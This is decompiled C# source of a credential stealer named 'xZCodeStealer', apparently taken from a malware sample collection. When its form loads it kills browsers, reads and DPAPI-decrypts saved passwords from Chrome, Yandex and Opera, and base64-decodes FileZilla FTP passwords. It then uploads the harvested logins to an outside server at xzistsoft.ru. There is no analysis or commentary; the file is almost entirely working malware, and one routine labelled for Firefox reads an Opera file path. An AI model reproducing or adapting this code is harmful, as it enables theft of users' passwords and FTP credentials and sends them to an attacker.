// Decompiled with JetBrains decompiler
// Type: xZCodeStealer.Form1
// Assembly: xZCodeStealer, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: C59B54FE-9430-4A55-9E31-E9237A48FD97
// Assembly location: C:\Users\gorno\Desktop\malware\stealer\Samples\Out\System Disk.exe

using System;
using System.ComponentModel;
using System.Data;
using System.Data.SQLite;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows.Forms;
using System.Xml.Linq;

namespace xZCodeStealer
{
  public class Form1 : Form
  {
    private IContainer components;

    public Form1()
    {
      this.InitializeComponent();
    }

    private static void Steelg()
    {
      try
      {
        foreach (Process process in Process.GetProcesses())
        {
          if (process.ProcessName.ToString() == "chrome")
            process.Kill();
        }
        string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
        string str1 = "\\Google\\Chrome\\User Data\\Default\\Login Data";
        string connectionString = string.Format("Data Source = {0}", (object) (folderPath + str1));
        string str2 = "\\";
        string machineName = Environment.MachineName;
        string str3 = "G.txt";
        string str4 = folderPath + str2 + machineName + str3;
        StreamWriter streamWriter = new StreamWriter(str4, false, Encoding.UTF8);
        string str5 = "logins";
        byte[] entropyBytes = (byte[]) null;
        DataTable dataTable = new DataTable();
        using (SQLiteConnection connection = new SQLiteConnection(connectionString))
          new SQLiteDataAdapter(new SQLiteCommand(string.Format("SELECT * FROM {0}", (object) str5), connection)).Fill(dataTable);
        int count = dataTable.Rows.Count;
        for (int index = 0; index < count; ++index)
        {
          string str6 = dataTable.Rows[index][1].ToString();
          string str7 = dataTable.Rows[index][3].ToString();
          string description;
          string str8 = new UTF8Encoding(true).GetString(Form1.DPAPI.Decrypt((byte[]) dataTable.Rows[index][5], entropyBytes, out description));
          streamWriter.WriteLine("----------------------------");
          streamWriter.WriteLine(string.Format("Номер лога: {0}", (object) index));
          streamWriter.WriteLine(string.Format("Сайт: {0}", (object) str6));
          streamWriter.WriteLine(string.Format("Логин: {0}", (object) str7));
          streamWriter.WriteLine(string.Format("Пароль: {0}", (object) str8));
        }
        streamWriter.Close();
        try
        {
          new WebClient().UploadFile("http://xzistsoft.ru/logs/darkweb/upload.php", str4);
          HttpWebRequest httpWebRequest1 = (HttpWebRequest) WebRequest.Create("http://xzistsoft.ru/logs/darkweb/log.php?file=" + Environment.MachineName + "G.txt");
          HttpWebRequest httpWebRequest2 = (HttpWebRequest) WebRequest.Create("http://xzistsoft.ru/logs/darkweb/mail.php?user=" + Environment.MachineName);
          httpWebRequest1.GetResponse();
          httpWebRequest2.GetResponse();
        }
        catch
        {
        }
      }
      catch
      {
      }
    }

    private static void Steelf()
    {
      try
      {
        foreach (Process process in Process.GetProcesses())
        {
          if (process.ProcessName.ToString() == "firefox")
            process.Kill();
        }
        string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
        string str1 = "\\Opera\\Opera\\profile\\wand.dat";
        string connectionString = string.Format("Data Source = {0}", (object) (folderPath + str1));
        string str2 = "\\";
        string machineName = Environment.MachineName;
        string str3 = "F.txt";
        string str4 = folderPath + str2 + machineName + str3;
        StreamWriter streamWriter = new StreamWriter(str4, false, Encoding.UTF8);
        string str5 = "logins";
        byte[] entropyBytes = (byte[]) null;
        DataTable dataTable = new DataTable();
        using (SQLiteConnection connection = new SQLiteConnection(connectionString))
          new SQLiteDataAdapter(new SQLiteCommand(string.Format("SELECT * FROM {0}", (object) str5), connection)).Fill(dataTable);
        int count = dataTable.Rows.Count;
        for (int index = 0; index < count; ++index)
        {
          string str6 = dataTable.Rows[index][1].ToString();
          string str7 = dataTable.Rows[index][3].ToString();
          string description;
          string str8 = new UTF8Encoding(true).GetString(Form1.DPAPI.Decrypt((byte[]) dataTable.Rows[index][5], entropyBytes, out description));
          streamWriter.WriteLine("----------------------------");
          streamWriter.WriteLine(string.Format("Номер лога: {0}", (object) index));
          streamWriter.WriteLine(string.Format("Сайт: {0}", (object) str6));
          streamWriter.WriteLine(string.Format("Логин: {0}", (object) str7));
          streamWriter.WriteLine(string.Format("Пароль: {0}", (object) str8));
        }
        streamWriter.Close();
        try
        {
          new WebClient().UploadFile("http://xzistsoft.ru/logs/darkweb/upload.php", str4);
          HttpWebRequest httpWebRequest1 = (HttpWebRequest) WebRequest.Create("http://xzistsoft.ru/logs/darkweb/log.php?file=" + Environment.MachineName + "F.txt");
          HttpWebRequest httpWebRequest2 = (HttpWebRequest) WebRequest.Create("http://xzistsoft.ru/logs/darkweb/mail.php?user=" + Environment.MachineName);
          httpWebRequest1.GetResponse();
          httpWebRequest2.GetResponse();
        }
        catch
        {
        }
      }
      catch
      {
      }
    }

    private static void Steely()
    {
      try
      {
        foreach (Process process in Process.GetProcesses())
        {
          if (process.ProcessName.ToString() == "browser")
            process.Kill();
        }
        string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
        string str1 = "\\Yandex\\YandexBrowser\\User Data\\Default\\Login Data";
        string connectionString = string.Format("Data Source = {0}", (object) (folderPath + str1));
        string str2 = "\\";
        string machineName = Environment.MachineName;
        string str3 = "Y.txt";
        string str4 = folderPath + str2 + machineName + str3;
        StreamWriter streamWriter = new StreamWriter(str4, false, Encoding.UTF8);
        string str5 = "logins";
        byte[] entropyBytes = (byte[]) null;
        DataTable dataTable = new DataTable();
        using (SQLiteConnection connection = new SQLiteConnection(connectionString))
          new SQLiteDataAdapter(new SQLiteCommand(string.Format("SELECT * FROM {0}", (object) str5), connection)).Fill(dataTable);
        int count = dataTable.Rows.Count;
        for (int index = 0; index < count; ++index)
        {
          string str6 = dataTable.Rows[index][1].ToString();
          string str7 = dataTable.Rows[index][3].ToString();
          string description;
          string str8 = new UTF8Encoding(true).GetString(Form1.DPAPI.Decrypt((byte[]) dataTable.Rows[index][5], entropyBytes, out description));
          streamWriter.WriteLine("----------------------------");
          streamWriter.WriteLine(string.Format("Номер лога: {0}", (object) index));
          streamWriter.WriteLine(string.Format("Сайт: {0}", (object) str6));
          streamWriter.WriteLine(string.Format("Логин: {0}", (object) str7));
          streamWriter.WriteLine(string.Format("Пароль: {0}", (object) str8));
        }
        streamWriter.Close();
        try
        {
          new WebClient().UploadFile("http://xzistsoft.ru/logs/darkweb/upload.php", str4);
          HttpWebRequest httpWebRequest1 = (HttpWebRequest) WebRequest.Create("http://xzistsoft.ru/logs/darkweb/log.php?file=" + Environment.MachineName + "Y.txt");
          HttpWebRequest httpWebRequest2 = (HttpWebRequest) WebRequest.Create("http://xzistsoft.ru/logs/darkweb/mail.php?user=" + Environment.MachineName);
          httpWebRequest1.GetResponse();
          httpWebRequest2.GetResponse();
        }
        catch
        {
        }
      }
      catch
      {
      }
    }

    private static void Steelo()
    {
      try
      {
        foreach (Process process in Process.GetProcesses())
        {
          if (process.ProcessName.ToString() == "opera")
            process.Kill();
        }
        string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
        string str1 = "\\Opera Software\\Opera Stable\\Login Data";
        string connectionString = string.Format("Data Source = {0}", (object) (folderPath + str1));
        string str2 = "\\";
        string machineName = Environment.MachineName;
        string str3 = "O.txt";
        string str4 = folderPath + str2 + machineName + str3;
        StreamWriter streamWriter = new StreamWriter(str4, false, Encoding.UTF8);
        string str5 = "logins";
        byte[] entropyBytes = (byte[]) null;
        DataTable dataTable = new DataTable();
        using (SQLiteConnection connection = new SQLiteConnection(connectionString))
          new SQLiteDataAdapter(new SQLiteCommand(string.Format("SELECT * FROM {0}", (object) str5), connection)).Fill(dataTable);
        int count = dataTable.Rows.Count;
        for (int index = 0; index < count; ++index)
        {
          string str6 = dataTable.Rows[index][1].ToString();
          string str7 = dataTable.Rows[index][3].ToString();
          string description;
          string str8 = new UTF8Encoding(true).GetString(Form1.DPAPI.Decrypt((byte[]) dataTable.Rows[index][5], entropyBytes, out description));
          streamWriter.WriteLine("----------------------------");
          streamWriter.WriteLine(string.Format("Номер лога: {0}", (object) index));
          streamWriter.WriteLine(string.Format("Сайт: {0}", (object) str6));
          streamWriter.WriteLine(string.Format("Логин: {0}", (object) str7));
          streamWriter.WriteLine(string.Format("Пароль: {0}", (object) str8));
        }
        streamWriter.Close();
        try
        {
          new WebClient().UploadFile("http://xzistsoft.ru/logs/darkweb/upload.php", str4);
          HttpWebRequest httpWebRequest1 = (HttpWebRequest) WebRequest.Create("http://xzistsoft.ru/logs/darkweb/log.php?file=" + Environment.MachineName + "O.txt");
          HttpWebRequest httpWebRequest2 = (HttpWebRequest) WebRequest.Create("http://xzistsoft.ru/logs/darkweb/mail.php?user=" + Environment.MachineName);
          httpWebRequest1.GetResponse();
          httpWebRequest2.GetResponse();
        }
        catch
        {
        }
      }
      catch
      {
      }
    }

    public void FileZillaStealer()
    {
      try
      {
        string contents = "";
        string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
        foreach (var data in XDocument.Load((TextReader) new StringReader(System.IO.File.ReadAllText(folderPath + "\\FileZilla\\sitemanager.xml"))).Descendants((XName) "Server").Select(user => new
        {
          host = user.Descendants((XName) "Host").SingleOrDefault<XElement>(),
          port = user.Descendants((XName) "Port").SingleOrDefault<XElement>(),
          login = user.Descendants((XName) "User").SingleOrDefault<XElement>(),
          pass = user.Descendants((XName) "Pass").SingleOrDefault<XElement>()
        }).ToList().Select(item => new
        {
          host = item.host != null ? item.host.Value : (string) null,
          port = item.port != null ? item.port.Value : (string) null,
          login = item.login != null ? item.login.Value : (string) null,
          pass = item.pass != null ? item.pass.Value : (string) null
        }))
        {
          string str1 = folderPath + "\\" + Environment.MachineName + "FTP.txt";
          string str2 = Encoding.UTF8.GetString(Convert.FromBase64String(data.pass));
          contents = contents + "Host: " + data.host + "\r\nPort: " + data.port + "\r\nLogin: " + data.login + "\r\nPass: " + str2 + "\r\n----------------------\r\n";
          System.IO.File.WriteAllText(str1, contents);
          try
          {
            new WebClient().UploadFile("http://xzistsoft.ru/logs/darkweb/upload.php", str1);
            HttpWebRequest httpWebRequest1 = (HttpWebRequest) WebRequest.Create("http://xzistsoft.ru/logs/darkweb/log.php?file=" + Environment.MachineName + "FTP.txt");
            HttpWebRequest httpWebRequest2 = (HttpWebRequest) WebRequest.Create("http://xzistsoft.ru/logs/darkweb/mail.php?user=" + Environment.MachineName);
            httpWebRequest1.GetResponse();
            httpWebRequest2.GetResponse();
          }
          catch
          {
          }
        }
      }
      catch
      {
      }
    }

    private void Form1_Load(object sender, EventArgs e)
    {
      this.FileZillaStealer();
      Form1.Steelg();
      Form1.Steelf();
      Form1.Steely();
      Form1.Steelo();
      this.Close();
    }

    protected override void Dispose(bool disposing)
    {
      if (disposing && this.components != null)
        this.components.Dispose();
      base.Dispose(disposing);
    }

    private void InitializeComponent()
    {
      this.SuspendLayout();
      this.AutoScaleDimensions = new SizeF(6f, 13f);
      this.AutoScaleMode = AutoScaleMode.Font;
      this.ClientSize = new Size(116, 0);
      this.Name = "Form1";
      this.Text = "Form1";
      this.Load += new EventHandler(this.Form1_Load);
      this.ResumeLayout(false);
    }

    public class DPAPI
    {
      private static IntPtr NullPtr = (IntPtr) 0;
      private static Form1.DPAPI.KeyType defaultKeyType = Form1.DPAPI.KeyType.UserKey;
      private const int CRYPTPROTECT_UI_FORBIDDEN = 1;
      private const int CRYPTPROTECT_LOCAL_MACHINE = 4;

      [DllImport("crypt32.dll", CharSet = CharSet.Auto, SetLastError = true)]
      private static extern bool CryptProtectData(ref Form1.DPAPI.DATA_BLOB pPlainText, string szDescription, ref Form1.DPAPI.DATA_BLOB pEntropy, IntPtr pReserved, ref Form1.DPAPI.CRYPTPROTECT_PROMPTSTRUCT pPrompt, int dwFlags, ref Form1.DPAPI.DATA_BLOB pCipherText);

      [DllImport("crypt32.dll", CharSet = CharSet.Auto, SetLastError = true)]
      private static extern bool CryptUnprotectData(ref Form1.DPAPI.DATA_BLOB pCipherText, ref string pszDescription, ref Form1.DPAPI.DATA_BLOB pEntropy, IntPtr pReserved, ref Form1.DPAPI.CRYPTPROTECT_PROMPTSTRUCT pPrompt, int dwFlags, ref Form1.DPAPI.DATA_BLOB pPlainText);

      private static void InitPrompt(ref Form1.DPAPI.CRYPTPROTECT_PROMPTSTRUCT ps)
      {
        ps.cbSize = Marshal.SizeOf(typeof (Form1.DPAPI.CRYPTPROTECT_PROMPTSTRUCT));
        ps.dwPromptFlags = 0;
        ps.hwndApp = Form1.DPAPI.NullPtr;
        ps.szPrompt = (string) null;
      }

      private static void InitBLOB(byte[] data, ref Form1.DPAPI.DATA_BLOB blob)
      {
        if (data == null)
          data = new byte[0];
        blob.pbData = Marshal.AllocHGlobal(data.Length);
        if (blob.pbData == IntPtr.Zero)
          throw new Exception("Unable to allocate data buffer for BLOB structure.");
        blob.cbData = data.Length;
        Marshal.Copy(data, 0, blob.pbData, data.Length);
      }

      public static string Encrypt(string plainText)
      {
        return Form1.DPAPI.Encrypt(Form1.DPAPI.defaultKeyType, plainText, string.Empty, string.Empty);
      }

      public static string Encrypt(Form1.DPAPI.KeyType keyType, string plainText)
      {
        return Form1.DPAPI.Encrypt(keyType, plainText, string.Empty, string.Empty);
      }

      public static string Encrypt(Form1.DPAPI.KeyType keyType, string plainText, string entropy)
      {
        return Form1.DPAPI.Encrypt(keyType, plainText, entropy, string.Empty);
      }

      public static string Encrypt(Form1.DPAPI.KeyType keyType, string plainText, string entropy, string description)
      {
        if (plainText == null)
          plainText = string.Empty;
        if (entropy == null)
          entropy = string.Empty;
        return Convert.ToBase64String(Form1.DPAPI.Encrypt(keyType, Encoding.UTF8.GetBytes(plainText), Encoding.UTF8.GetBytes(entropy), description));
      }

      public static byte[] Encrypt(Form1.DPAPI.KeyType keyType, byte[] plainTextBytes, byte[] entropyBytes, string description)
      {
        if (plainTextBytes == null)
          plainTextBytes = new byte[0];
        if (entropyBytes == null)
          entropyBytes = new byte[0];
        if (description == null)
          description = string.Empty;
        Form1.DPAPI.DATA_BLOB dataBlob1 = new Form1.DPAPI.DATA_BLOB();
        Form1.DPAPI.DATA_BLOB pCipherText = new Form1.DPAPI.DATA_BLOB();
        Form1.DPAPI.DATA_BLOB dataBlob2 = new Form1.DPAPI.DATA_BLOB();
        Form1.DPAPI.CRYPTPROTECT_PROMPTSTRUCT cryptprotectPromptstruct = new Form1.DPAPI.CRYPTPROTECT_PROMPTSTRUCT();
        Form1.DPAPI.InitPrompt(ref cryptprotectPromptstruct);
        try
        {
          try
          {
            Form1.DPAPI.InitBLOB(plainTextBytes, ref dataBlob1);
          }
          catch (Exception ex)
          {
            throw new Exception("Cannot initialize plaintext BLOB.", ex);
          }
          try
          {
            Form1.DPAPI.InitBLOB(entropyBytes, ref dataBlob2);
          }
          catch (Exception ex)
          {
            throw new Exception("Cannot initialize entropy BLOB.", ex);
          }
          int dwFlags = 1;
          if (keyType == Form1.DPAPI.KeyType.MachineKey)
            dwFlags |= 4;
          if (!Form1.DPAPI.CryptProtectData(ref dataBlob1, description, ref dataBlob2, IntPtr.Zero, ref cryptprotectPromptstruct, dwFlags, ref pCipherText))
            throw new Exception("CryptProtectData failed.", (Exception) new Win32Exception(Marshal.GetLastWin32Error()));
          byte[] destination = new byte[pCipherText.cbData];
          Marshal.Copy(pCipherText.pbData, destination, 0, pCipherText.cbData);
          return destination;
        }
        catch (Exception ex)
        {
          throw new Exception("DPAPI was unable to encrypt data.", ex);
        }
        finally
        {
          if (dataBlob1.pbData != IntPtr.Zero)
            Marshal.FreeHGlobal(dataBlob1.pbData);
          if (pCipherText.pbData != IntPtr.Zero)
            Marshal.FreeHGlobal(pCipherText.pbData);
          if (dataBlob2.pbData != IntPtr.Zero)
            Marshal.FreeHGlobal(dataBlob2.pbData);
        }
      }

      public static string Decrypt(string cipherText)
      {
        string description;
        return Form1.DPAPI.Decrypt(cipherText, string.Empty, out description);
      }

      public static string Decrypt(string cipherText, out string description)
      {
        return Form1.DPAPI.Decrypt(cipherText, string.Empty, out description);
      }

      public static string Decrypt(string cipherText, string entropy, out string description)
      {
        if (entropy == null)
          entropy = string.Empty;
        return Encoding.UTF8.GetString(Form1.DPAPI.Decrypt(Convert.FromBase64String(cipherText), Encoding.UTF8.GetBytes(entropy), out description));
      }

      public static byte[] Decrypt(byte[] cipherTextBytes, byte[] entropyBytes, out string description)
      {
        Form1.DPAPI.DATA_BLOB pPlainText = new Form1.DPAPI.DATA_BLOB();
        Form1.DPAPI.DATA_BLOB dataBlob1 = new Form1.DPAPI.DATA_BLOB();
        Form1.DPAPI.DATA_BLOB dataBlob2 = new Form1.DPAPI.DATA_BLOB();
        Form1.DPAPI.CRYPTPROTECT_PROMPTSTRUCT cryptprotectPromptstruct = new Form1.DPAPI.CRYPTPROTECT_PROMPTSTRUCT();
        Form1.DPAPI.InitPrompt(ref cryptprotectPromptstruct);
        description = string.Empty;
        try
        {
          try
          {
            Form1.DPAPI.InitBLOB(cipherTextBytes, ref dataBlob1);
          }
          catch (Exception ex)
          {
            throw new Exception("Cannot initialize ciphertext BLOB.", ex);
          }
          try
          {
            Form1.DPAPI.InitBLOB(entropyBytes, ref dataBlob2);
          }
          catch (Exception ex)
          {
            throw new Exception("Cannot initialize entropy BLOB.", ex);
          }
          int dwFlags = 1;
          if (!Form1.DPAPI.CryptUnprotectData(ref dataBlob1, ref description, ref dataBlob2, IntPtr.Zero, ref cryptprotectPromptstruct, dwFlags, ref pPlainText))
            throw new Exception("CryptUnprotectData failed.", (Exception) new Win32Exception(Marshal.GetLastWin32Error()));
          byte[] destination = new byte[pPlainText.cbData];
          Marshal.Copy(pPlainText.pbData, destination, 0, pPlainText.cbData);
          return destination;
        }
        catch (Exception ex)
        {
          throw new Exception("DPAPI was unable to decrypt data.", ex);
        }
        finally
        {
          if (pPlainText.pbData != IntPtr.Zero)
            Marshal.FreeHGlobal(pPlainText.pbData);
          if (dataBlob1.pbData != IntPtr.Zero)
            Marshal.FreeHGlobal(dataBlob1.pbData);
          if (dataBlob2.pbData != IntPtr.Zero)
            Marshal.FreeHGlobal(dataBlob2.pbData);
        }
      }

      [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
      internal struct DATA_BLOB
      {
        public int cbData;
        public IntPtr pbData;
      }

      [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
      internal struct CRYPTPROTECT_PROMPTSTRUCT
      {
        public int cbSize;
        public int dwPromptFlags;
        public IntPtr hwndApp;
        public string szPrompt;
      }

      public enum KeyType
      {
        UserKey = 1,
        MachineKey = 2,
      }
    }
  }
}
